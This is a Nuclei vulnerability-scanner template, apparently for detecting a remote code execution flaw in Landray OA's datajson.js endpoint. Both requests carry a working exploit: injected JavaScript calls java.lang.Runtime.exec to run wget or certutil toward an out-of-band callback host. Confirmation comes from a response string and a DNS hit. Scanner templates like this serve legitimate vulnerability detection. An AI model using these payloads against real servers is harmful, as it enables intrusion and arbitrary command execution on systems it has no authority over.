id: landray-oa-datajson-s-bean-rce
info:
  name: Landray OA datajson.js RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a remote code execution vulnerability in Landray OA's datajson.js endpoint by injecting malicious scripts.
  reference:
    - https://www.cnsuc.net/thread-553.htm
http:
  - raw:
      - |
        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("wget%20-P%20/tmp/%20{{interactsh-url}}")&type=1 HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "模拟通过"
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
  - raw:
      - |
        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("certutil%20-urlcache%20-split%20-f%20{{interactsh-url}}")&type=1 HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "模拟通过"
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
